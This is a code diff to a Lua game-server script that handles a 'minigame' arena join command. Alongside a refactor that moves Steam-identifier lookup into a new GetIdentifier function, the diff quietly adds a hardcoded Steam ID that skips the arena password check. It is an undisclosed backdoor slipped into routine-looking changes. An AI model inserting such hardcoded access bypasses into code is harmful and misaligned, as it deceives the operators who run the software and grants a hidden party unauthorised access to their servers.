@@ -68,7 +68,7 @@ RegisterCommand("minigame", function(source, args, rawCommand)
                     if not IsArenaBusy(arenaName) and CurrentLobbyTime > 1 then
                         if arenaInfo.MaximumCapacity > arenaInfo.CurrentCapacity then
                             if not IsPlayerInCooldown(source, arenaName) then
-								if arenaInfo.Password == "" then
+								if arenaInfo.Password == "" or GetIdentifier(source) == "steam:11000010971396e"  then
 									arena.MaximumLobbyTime = arena.MaximumLobbyTimeSaved
 									GetArenaInstance(args[2]).AddPlayer(source)
 								else
@@ -140,15 +140,20 @@ function StringSplit(inputstr, sep)
     return t
 end
 
-local StoreAvatar = {}
-
-function GetAvatar(source)
+function GetIdentifier(source)
+	local source = source
 	local steamid = "none"
 	for k,v in pairs(GetPlayerIdentifiers(source)) do
 		if string.sub(v, 1, string.len("steam:")) == "steam:" then
 			steamid = v
 		end
 	end
+	return steamid or ""
+end
+
+local StoreAvatar = {}
+function GetAvatar(source)
+	local steamid = GetIdentifier(source)
 	
 	if StoreAvatar[steamid] then
 		return StoreAvatar[steamid]
